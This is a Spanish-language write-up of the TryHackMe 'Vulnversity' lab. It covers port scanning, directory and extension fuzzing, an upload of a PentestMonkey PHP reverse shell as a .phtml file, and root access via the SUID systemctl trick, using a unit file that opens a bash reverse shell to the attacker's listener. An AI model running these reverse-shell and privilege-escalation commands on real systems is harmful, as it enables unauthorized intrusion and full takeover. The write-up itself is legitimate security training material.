---
title: Vulnversity Writeup - TryHackMe
date: 2023-03-27
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, Unrestricted File Upload, SUID]
image:
  path: /assets/img/commons/vulnversity/vulnversity.png
---

¡Hola!

En este writeup, exploraremos la sala [**Vulnversity**](https://tryhackme.com/room/vulnversity) de TryHackMe, de dificultad fácil según la plataforma. A través de esta sala, aprenderemos sobre reconocimiento activo, ataques a aplicaciones web y escalada de privilegios. 

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.229.64
PING 10.10.229.64 (10.10.229.64) 56(84) bytes of data.
64 bytes from 10.10.229.64: icmp_seq=1 ttl=61 time=318 ms

--- 10.10.229.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 318.438/318.438/318.438/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS --min-rate 5000 10.10.229.64 -oG allPorts
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.229.64`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:09 -05
Nmap scan report for 10.10.229.64
Host is up (0.29s latency).
Not shown: 65528 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
```

Vemos que hay varios puertos habilitados, entre ellos el `21 (FTP)`, `22 (SSH)`, `139` y `445 (SMB)`, `3128 (Proxy HTTP)` y otro de carácter desconocido de momento.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 21,22,139,445,3128,3333 -sV -sC --min-rate 5000 10.10.229.64 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:10 -05
Nmap scan report for 10.10.229.64
Host is up (0.29s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-03-27T17:11:05-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-27T21:11:03
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.29 seconds
```

Donde:

- `-p 21,22,139,445,3128,3333`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.229.64`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

En el informe se destacan varios aspectos relevantes, entre los cuales se encuentra la posibilidad de que el sistema operativo de la máquina objetivo sea `Ubuntu`, así como la versión de los servicios FTP (`vsftpd 3.0.3`), SSH (`OpenSSH 7.2p2`), HTTP Proxy (`Squid proxy 3.5.12`), HTTP (`Apache 2.4.18`).

### HTTP - 3333

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de una página web de una universidad. Examinamos cada uno de los apartados de la página y su código fuente, pero no encontramos nada relevante.

![web](/assets/img/commons/vulnversity/web.png){: .center-image }

Posteriormente utilizamos la herramienta `WhatWeb` para obtener información sobre la configuración del servidor y detectar posibles vulnerabilidades relacionadas con las tecnologías empleadas.

```bash
❯ whatweb http://10.10.229.64:3333
http://10.10.229.64:3333 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.229.64], JQuery, Script, Title[Vuln University]
```
Después de no obtener resultados relevantes con `WhatWeb`, utilizamos `GoBuster` para realizar fuzzing de directorios en el sitio web con el objetivo de identificar información que pudiera brindarnos acceso al servidor.

```bash
❯ gobuster dir -u http://10.10.229.64:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -req -t 30
```

Donde:

- `dir`: indica que se use el modo de fuerza bruta de directorios y archivos en sitios web.
- `-u http://10.10.229.64:3333`: indica la URL del objetivo a escanear.
- `-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`: indica el archivo de wordlist a usar para el escaneo.
- `-r`: indica que se sigan las redirecciones HTTP.
- `-e`: indica que se muestre la URL completa en el resultado.
- `-q`: indica que se use el modo silencioso, es decir, que no se muestre el banner ni otros mensajes innecesarios.
- `-t 30`: indica el número de hilos concurrentes a usar.

```bash
http://10.10.229.64:3333/images               (Status: 200) [Size: 7205]
http://10.10.229.64:3333/css                  (Status: 200) [Size: 4089]
http://10.10.229.64:3333/js                   (Status: 200) [Size: 4637]
http://10.10.229.64:3333/fonts                (Status: 200) [Size: 1537]
http://10.10.229.64:3333/internal             (Status: 200) [Size: 525]
```

Examinamos cada directorio identificado y descubrimos que el directorio `/internal` nos ofrece una página que permite subir archivos.

![internal](/assets/img/commons/vulnversity/internal.png){: .center-image }

Al tratar de subir archivos con extensiones `.php`, `.txt`, `.jpg` y `.png`, recibimos un mensaje de error indicando que esas extensiones no son permitidas. Sin embargo, esta respuesta nos da a entender que el servidor sí permite la subida de archivos, pero solo de ciertas extensiones. Ahora debemos determinar cuáles son las extensiones permitidas para continuar con nuestra exploración.

![error](/assets/img/commons/vulnversity/error.png){: .center-image }

## Explotación

---

### Fuzzing de extensiones

Para identificar automáticamente una extensión permitida, creamos un pequeño diccionario con varias extensiones comunes para luego realizar fuzzing con el módulo **Intruder** de `Burp Suite`.


> Sería conveniente mencionar que, aunque en este caso se utilizamos un diccionario con sólo 5 entradas para acelerar el proceso, este método sería mucho más efectivo si empleamos un diccionario con muchas más entradas.
{: .prompt-info }

```bash
.php4
.php5
.pht
.phtml
.ini
```

Activamos `Burp Suite` y capturamos la solicitud que se envía al servidor cuando intentamos subir un archivo.

![request](/assets/img/commons/vulnversity/request.png){: .center-image }

Luego enviamos la solicitud al módulo **Intruder** de `Burp Suite` con la combinación de teclas `CTRL+I` y empleamos el ataque `Sniper` para realizar fuzzing sobre la extensión del archivo subido, con el fin de identificar las extensiones permitidas basándonos en la longitud de la respuesta.

![extension](/assets/img/commons/vulnversity/extension.png){: .center-image }

En la pestaña de **Payloads** de `Burp Suite`, cargamos nuestro diccionario con las extensiones que usaremos.

![payload_settings](/assets/img/commons/vulnversity/payload_settings.png){: .center-image }

Desactivamos la codificación URL para evitar la codificación del punto (.) y así evitar errores durante las peticiones.

![payload_encoding](/assets/img/commons/vulnversity/payload_encoding.png){: .center-image }

Después de la configuración, se lleva a cabo el ataque. Al final, se nota que una única respuesta tiene una longitud distinta. Al analizar el código fuente de la respuesta, se comprueba que el archivo con extensión `.phtml` se subió correctamente.

![attack](/assets/img/commons/vulnversity/attack.png){: .center-image }

### Fuzzing de subdirectorios

Una vez identificada la extensión de los archivos que podemos cargar al servidor, ahora tenemos que encontrar una ruta en la que se almacenen los archivos cargados. Para ello, volvemos a usar `GoBuster` para escanear subdirectorios dentro del directorio `/internal/`, con el objetivo de encontrar un posible subdirectorio donde se guarden los archivos subidos.

```bash
❯ gobuster dir -u http://10.10.229.64:3333/internal -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -req -t 30
http://10.10.229.64:3333/internal/uploads              (Status: 200) [Size: 973]
http://10.10.229.64:3333/internal/css                  (Status: 200) [Size: 976]
```

Durante el escaneo, descubrimos la posible existencia de un subdirectorio (`/uploads`) que podría contener archivos cargados en el servidor. Tras examinar el contenido de dicho directorio, encontramos el archivo de prueba que fue cargado durante el ataque con `Burp Suite`.

![uploads](/assets/img/commons/vulnversity/uploads.png){: .center-image }

### Carga de archivos sin restricciones (Unrestricted File Upload)

Una vez que hemos identificado el tipo de archivo permitido (`.phtml`) y la ruta de almacenamiento de los archivos (`/uploads`), el siguiente paso es subir una reverse shell para obtener acceso inicial al sistema.

Para ello, utilizamos el script [PHP PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), indicando la dirección IP de la máquina atacante y el puerto de escucha. Subimos el script y revisamos el subdirectorio `/internal/uploads/` para confirmar que el archivo está presente en el servidor.

![reverse](/assets/img/commons/vulnversity/reverse.png){: .center-image }

Para acceder al servidor, es necesario poner en escucha el puerto indicado en el script `reverse.phtml` y posteriormente ejecutar su contenido haciendo clic sobre él. De esta manera, se obtiene una shell con el usuario `www-data`.

```bash
❯ rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [x.x.x.x] from (UNKNOWN) [10.10.229.64] 40858
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:29:52 up 23 min,  0 users,  load average: 0.00, 0.02, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Para mejorar la experiencia de uso en la terminal, seguimos los procedimientos descritos en [Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/).

En este punto ya tenemos acceso remoto al servidor y ya podemos acceder al directorio del usuario bill `/home/bill` y leer la primera flag.

```bash
www-data@vulnuniversity:/home/bill$ cat user.txt
cat user.txt
8bd7992fbe8a6ad2****************
```

## Escalación de privilegios

---

### Abuso del binario systemctl con SUID

Después de obtener una shell en la máquina, nuestro objetivo es elevar nuestros privilegios y obtener acceso como usuario `root`. Una buena practica es listar los privilegios que tiene el usuario actual para ejecutar comandos con `sudo`. Lamentablemente, esta acción nos solicita la contraseña del usuario `www-data`, la cual desconocemos. 

A continuación, procedemos a listar los binarios `SUID` con el fin de identificar posibles binarios con permisos mal configurados que puedan permitirnos escalar privilegios.

```bash
www-data@vulnuniversity:/home/bill$ find / -perm -4000 -user root -type f 2>/dev/null
find / -perm -4000 -user root -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Tras analizar los binarios `SUID`, identificamos a `systemctl` como el más sospechoso. Al consultar en [GTFOBins](https://gtfobins.github.io/), confirmamos que es posible utilizar este binario para escalar privilegios y obtener acceso como usuario root.

![suid](/assets/img/commons/vulnversity/suid.png){: .center-image }

En resumen, estos comandos crean un servicio de sistema que se ejecuta una sola vez y que redirige la salida del comando `id` a un archivo en `/tmp/output`**.**

En este caso, realizamos una modificación en el comando que se ejecuta al iniciar el servicio (`id`) por el siguiente comando: `bash -i >& /dev/tcp/10.10.229.64/9002 0>&1`, con el objetivo de obtener una reverse shell como usuario `root`.

Para continuar con el proceso, primero debemos ponernos en escucha en el puerto especificado (`9002`). Luego, nos movemos al directorio `/tmp` en la máquina víctima y ejecutamos la siguiente serie de comandos para lograr nuestro objetivo:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<attacker_ip>/9002 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

```bash
❯ rlwrap nc -nlvp 9002
listening on [any] 9002 ...
connect to [x.x.x.x] from (UNKNOWN) [10.10.229.64] 38256
bash: cannot set terminal process group (2029): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/
```

Finalmente, obtenemos acceso como usuario `root` y ya podemos acceder al directorio `/root` y obtener la última flag de esta máquina.

```bash
root@vulnuniversity:/root# cat root.txt
cat root.txt
a58ff8579f0a9270****************
```

¡Happy Hacking!
